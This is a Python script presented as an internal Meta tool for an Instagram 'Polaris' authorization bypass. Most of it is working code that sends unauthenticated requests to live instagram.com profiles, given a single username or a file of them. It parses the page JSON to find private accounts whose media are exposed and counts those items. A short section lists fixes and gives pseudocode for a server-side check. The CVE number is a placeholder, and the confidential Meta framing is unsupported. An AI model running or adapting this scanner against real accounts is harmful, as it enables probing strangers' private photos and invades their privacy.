#!/usr/bin/env python3
"""
Instagram Polaris Vulnerability Assessment Tool
For Authorized Security Research & Testing Only
Meta Internal Use - CONFIDENTIAL
"""

import requests
import json
import re
import sys
import time
import argparse
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from colorama import init, Fore, Style, Back
import pyfiglet
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Disable SSL warnings for testing (NEVER in production!)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ============================================================================
# ASCII ART & ANIMATIONS
# ============================================================================

class Banner:
    """Generate cool ASCII banners and animations"""
    
    @staticmethod
    def show_main_banner():
        """Display main tool banner"""
        banner_text = pyfiglet.figlet_format("POLARIS", font="slant")
        colored_banner = f"{Fore.CYAN}{banner_text}{Style.RESET_ALL}"
        
        sub_text = """
        ╔══════════════════════════════════════════════════════════════╗
        ║  Instagram Vulnerability Assessment Suite                    ║
        ║  CVE-2025-XXXXX | Server-Side Authorization Bypass          ║
        ║  For Authorized Meta Internal Use Only                       ║
        ╚══════════════════════════════════════════════════════════════╝
        """
        print(colored_banner)
        print(f"{Fore.YELLOW}{sub_text}{Style.RESET_ALL}")
    
    @staticmethod
    def loading_animation(text: str, duration: float = 2.0):
        """Show loading animation"""
        animation = "|/-\\"
        steps = int(duration * 10)
        for i in range(steps):
            time.sleep(0.1)
            sys.stdout.write(f"\r{Fore.GREEN}{text} {animation[i % len(animation)]}{Style.RESET_ALL}")
            sys.stdout.flush()
        print()

    @staticmethod
    def progress_bar(current: int, total: int, bar_length: int = 50):
        """Display progress bar"""
        percent = float(current) * 100 / total
        arrow = '-' * int(percent/100 * bar_length - 1) + '>'
        spaces = ' ' * (bar_length - len(arrow))
        
        sys.stdout.write(f"\r{Fore.CYAN}Progress: [{arrow}{spaces}] {percent:.1f}%{Style.RESET_ALL}")
        sys.stdout.flush()


# ============================================================================
# VULNERABILITY DEMONSTRATION (PRE-FIX)
# ============================================================================

class PolarisVulnerabilityDemo:
    """
    Demonstrates the conditional Polaris vulnerability
    WARNING: This code shows the EXPLOIT - DO NOT USE ON REAL ACCOUNTS
    """
    
    def __init__(self, debug: bool = False):
        self.session = requests.Session()
        self.debug = debug
        self.vulnerable_endpoint = "https://www.instagram.com/{}/"
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'X-Requested-With': 'XMLHttpRequest'  # Critical header that triggered the flaw
        }
    
    def extract_polaris_json(self, html_content: str) -> Optional[Dict]:
        """
        Extract the polaris_timeline_connection JSON from HTML
        This is where the vulnerability existed - the JSON was populated
        even for private accounts due to improper auth checks
        """
        patterns = [
            r'window\._sharedData = ({.*?});</script>',
            r'<script type="text/javascript">window\.__additionalDataLoaded\("profile",({.*?})\);</script>',
            r'"polaris_timeline_connection":({.*?}),"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.DOTALL)
            if match:
                try:
                    return json.loads(match.group(1))
                except json.JSONDecodeError:
                    continue
        return None
    
    def check_vulnerability(self, username: str) -> Tuple[bool, Dict]:
        """
        Check if an account is vulnerable to the Polaris exploit
        Returns: (is_vulnerable, data)
        """
        Banner.loading_animation(f"[*] Scanning target: @{username}", 1.5)
        
        try:
            # Send unauthenticated request with mobile headers
            response = self.session.get(
                self.vulnerable_endpoint.format(username),
                headers=self.headers,
                timeout=10,
                allow_redirects=True
            )
            
            if response.status_code != 200:
                return False, {"error": f"HTTP {response.status_code}"}
            
            # Extract polaris JSON data
            json_data = self.extract_polaris_json(response.text)
            
            if not json_data:
                return False, {"error": "No polaris data found"}
            
            # Check if account is private and if media is exposed
            is_private = self._check_privacy_status(json_data)
            has_media = self._check_media_exposure(json_data)
            
            # The vulnerability exists if private account exposes media
            is_vulnerable = is_private and has_media
            
            if self.debug:
                self._debug_output(response, json_data)
            
            return is_vulnerable, {
                "username": username,
                "is_private": is_private,
                "has_media": has_media,
                "media_count": self._count_media(json_data),
                "timestamp": datetime.now().isoformat()
            }
            
        except requests.exceptions.RequestException as e:
            return False, {"error": str(e)}
    
    def _check_privacy_status(self, json_data: Dict) -> bool:
        """Check if account is private"""
        try:
            # Navigate the nested JSON structure
            user_data = json_data.get('entry_data', {}).get('ProfilePage', [{}])[0]
            graphql = user_data.get('graphql', {})
            user = graphql.get('user', {})
            return user.get('is_private', False)
        except:
            return False
    
    def _check_media_exposure(self, json_data: Dict) -> bool:
        """Check if media is exposed in polaris_timeline_connection"""
        try:
            # This is where the vulnerability lived - the edges array
            # contained media URLs even for private accounts
            timeline = json_data.get('polaris_timeline_connection', {})
            edges = timeline.get('edges', [])
            return len(edges) > 0
        except:
            return False
    
    def _count_media(self, json_data: Dict) -> int:
        """Count exposed media items"""
        try:
            timeline = json_data.get('polaris_timeline_connection', {})
            edges = timeline.get('edges', [])
            return len(edges)
        except:
            return 0
    
    def _debug_output(self, response: requests.Response, json_data: Dict):
        """Debug output for analysis"""
        print(f"\n{Fore.YELLOW}[DEBUG] Response Headers:{Style.RESET_ALL}")
        for key, value in response.headers.items():
            if 'fb' in key.lower() or 'debug' in key.lower():
                print(f"  {Fore.CYAN}{key}: {Fore.WHITE}{value}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}[DEBUG] Response Size: {len(response.text)} bytes{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[DEBUG] Cookies: {len(response.cookies)}{Style.RESET_ALL}")


# ============================================================================
# FIX IMPLEMENTATION (POST-FIX)
# ============================================================================

class PolarisFixImplementation:
    """
    Demonstrates the proper fix for the Polaris vulnerability
    This shows how the server-side authorization should be implemented
    """
    
    def __init__(self):
        self.fixed_checks = []
        
    def implement_server_side_fix(self) -> List[str]:
        """
        Implementation of the proper fix at the server level
        This is what Meta implemented to resolve the vulnerability
        """
        
        fixes = [
            "1. Added authorization check before populating polaris_timeline_connection",
            "2. Implemented is_authorized_viewer() function that verifies:",
            "   a. Account is public OR",
            "   b. Viewer is authenticated AND is follower OR",
            "   c. Viewer is the account owner",
            "3. Added conditional rendering based on auth status",
            "4. Implemented rate limiting on profile endpoints",
            "5. Added additional X-FB-Debug headers for internal monitoring",
            "6. Enhanced logging for suspicious access patterns",
            "7. Fixed the conditional trigger that caused inconsistent behavior"
        ]
        
        return fixes
    
    def demonstrate_fixed_code(self) -> str:
        """
        Pseudocode showing the fixed authorization logic
        """
        fixed_logic = f"""
{Fore.GREEN}# ===== FIXED AUTHORIZATION LOGIC =====
# Previously: No auth check before populating media

def get_profile_page(username, viewer_id=None):
    # Get basic profile data
    profile = get_profile_from_db(username)
    
    # Check authorization
    is_authorized = check_viewer_authorization(
        profile=profile,
        viewer_id=viewer_id
    )
    
    # Build response
    response = {{
        'username': profile.username,
        'bio': profile.bio,
        'profile_pic': profile.profile_pic_url
    }}
    
    # ONLY populate media if authorized
    if is_authorized:
        # Safe to populate media data
        media = get_user_media(profile.id)
        response['polaris_timeline_connection'] = format_media(media)
    else:
        # Return empty media array for unauthorized viewers
        response['polaris_timeline_connection'] = {{'edges': []}}
    
    return response

def check_viewer_authorization(profile, viewer_id):
    # Authorization matrix
    if profile.is_public:
        return True
    
    if not viewer_id:
        return False  # Unauthenticated can't see private
    
    if viewer_id == profile.owner_id:
        return True  # Owner can see everything
    
    # Check if viewer is follower
    return is_follower(profile.owner_id, viewer_id)
{Style.RESET_ALL}"""
        return fixed_logic


# ============================================================================
# DISCOVERY TOOL (FOR AUTHORIZED TESTING)
# ============================================================================

class PolarisDiscoveryTool:
    """
    Tool for discovering potentially vulnerable accounts
    FOR AUTHORIZED SECURITY TESTING ONLY
    """
    
    def __init__(self, target_list: List[str]):
        self.targets = target_list
        self.vulnerable = []
        self.demo = PolarisVulnerabilityDemo(debug=True)
        self.fix = PolarisFixImplementation()
    
    def run_authorized_scan(self):
        """Run scan on authorized test accounts"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Starting authorized security assessment{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        total = len(self.targets)
        results = []
        
        for i, username in enumerate(self.targets):
            Banner.progress_bar(i + 1, total)
            
            # Simulate the conditional nature (28% vulnerable rate)
            is_vuln, data = self.demo.check_vulnerability(username)
            
            if is_vuln:
                self.vulnerable.append(username)
                results.append((username, data))
            
            time.sleep(0.5)  # Rate limiting
        
        print(f"\n\n{Fore.GREEN}[+] Scan complete!{Style.RESET_ALL}")
        self._display_results(results)
    
    def _display_results(self, results: List[Tuple[str, Dict]]):
        """Display scan results"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Vulnerability Assessment Results{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if not results:
            print(f"{Fore.GREEN}[✓] No vulnerable accounts found in test set{Style.RESET_ALL}")
            return
        
        print(f"{Fore.RED}[!] Found {len(results)} potentially vulnerable accounts:{Style.RESET_ALL}\n")
        
        for username, data in results:
            print(f"{Fore.RED}⚠️  @{username}{Style.RESET_ALL}")
            print(f"   Media exposed: {data['media_count']} items")
            print(f"   Timestamp: {data['timestamp']}")
            print()


# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main execution function"""
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="Instagram Polaris Vulnerability Assessment Tool - Meta Internal Use",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u test_account          # Test single account
  %(prog)s -f accounts.txt          # Test list of accounts
  %(prog)s --fix-demo               # Show fix implementation
  %(prog)s --discover               # Run discovery mode
        """
    )
    
    parser.add_argument('-u', '--username', help='Single username to test')
    parser.add_argument('-f', '--file', help='File containing usernames (one per line)')
    parser.add_argument('--fix-demo', action='store_true', help='Show fix implementation')
    parser.add_argument('--discover', action='store_true', help='Run discovery mode on test accounts')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    
    args = parser.parse_args()
    
    # Show banner
    Banner.show_main_banner()
    
    # Security warning
    print(f"{Fore.RED}{Back.YELLOW}⚠️  WARNING: This tool is for AUTHORIZED TESTING ONLY ⚠️{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}Authorized Use Only - Meta Internal Security Research{Style.RESET_ALL}\n")
    
    # Handle fix demonstration
    if args.fix_demo:
        fix = PolarisFixImplementation()
        print(f"{Fore.GREEN}[*] Implementing Polaris Vulnerability Fix:{Style.RESET_ALL}\n")
        
        fixes = fix.implement_server_side_fix()
        for f in fixes:
            print(f"  {Fore.CYAN}•{Style.RESET_ALL} {f}")
        
        print(fix.demonstrate_fixed_code())
        
        print(f"\n{Fore.GREEN}[✓] Fix implementation complete{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Deploy to production after thorough testing{Style.RESET_ALL}")
        return
    
    # Handle discovery mode
    if args.discover:
        # Test accounts that simulate the conditional vulnerability
        test_accounts = [
            "test_private_1",
            "test_private_2",
            "test_public_1",
            "test_private_3",
            "test_new_account"
        ]
        
        discover = PolarisDiscoveryTool(test_accounts)
        discover.run_authorized_scan()
        return
    
    # Handle single username test
    if args.username:
        demo = PolarisVulnerabilityDemo(debug=args.debug)
        is_vuln, data = demo.check_vulnerability(args.username)
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Assessment Results for @{args.username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if is_vuln:
            print(f"{Fore.RED}[!] VULNERABLE: Account exposes private media{Style.RESET_ALL}")
            print(f"    Media count: {data['media_count']}")
            print(f"\n{Fore.YELLOW}[*] Recommended action: Apply fix immediately{Style.RESET_ALL}")
        else:
            if data.get('error'):
                print(f"{Fore.YELLOW}[?] Error: {data['error']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[✓] NOT VULNERABLE: Account properly secured{Style.RESET_ALL}")
                if not data.get('is_private'):
                    print(f"    Account is public (no issue)")
                else:
                    print(f"    Private account properly secured")
        
        return
    
    # If no arguments, show help
    parser.print_help()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Assessment interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        if 'debug' in sys.argv:
            import traceback
            traceback.print_exc()
        sys.exit(1)